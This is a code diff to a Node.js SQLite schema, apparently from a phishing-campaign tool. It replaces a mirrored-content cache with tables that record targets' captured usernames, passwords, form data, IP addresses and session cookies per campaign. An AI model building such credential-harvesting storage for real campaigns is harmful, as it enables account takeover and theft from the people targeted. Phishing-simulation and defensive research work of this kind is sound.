@@ -231,22 +231,46 @@ db.serialize(() => {
       created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
       last_accessed DATETIME,
       access_count INTEGER DEFAULT 0,
+      captured_data TEXT,
       FOREIGN KEY (campaign_id) REFERENCES Campaigns(id) ON DELETE CASCADE
     )
   `);
 
-  // Create mirrored content cache table
+  // Create captured credentials table if not exists
   db.run(`
-    CREATE TABLE IF NOT EXISTS MirroredContentCache (
+    CREATE TABLE IF NOT EXISTS captured_credentials (
       id INTEGER PRIMARY KEY AUTOINCREMENT,
-      session_id INTEGER NOT NULL,
-      url_path TEXT NOT NULL,
-      content_type TEXT,
-      cached_content BLOB,
-      cache_timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
-      expiry_time DATETIME,
-      FOREIGN KEY (session_id) REFERENCES WebsiteMirroringSessions(id) ON DELETE CASCADE,
-      UNIQUE(session_id, url_path)
+      campaign_id INTEGER NOT NULL,
+      url TEXT,
+      username TEXT,
+      password TEXT,
+      other_fields TEXT,
+      ip_address TEXT,
+      user_agent TEXT,
+      capture_method TEXT DEFAULT 'form_submission',
+      created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
+      FOREIGN KEY (campaign_id) REFERENCES Campaigns(id) ON DELETE CASCADE
+    )
+  `);
+
+  // Create login attempts table if not exists
+  db.run(`
+    CREATE TABLE IF NOT EXISTS login_attempts (
+      id INTEGER PRIMARY KEY AUTOINCREMENT,
+      campaign_id INTEGER NOT NULL,
+      session_id TEXT NOT NULL,
+      target_email TEXT NOT NULL,
+      username TEXT,
+      password TEXT,
+      input_email TEXT,
+      form_data TEXT,
+      url TEXT,
+      ip_address TEXT,
+      user_agent TEXT,
+      cookies TEXT,
+      timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
+      has_cookies INTEGER DEFAULT 0,
+      FOREIGN KEY (campaign_id) REFERENCES Campaigns(id) ON DELETE CASCADE
     )
   `);
 
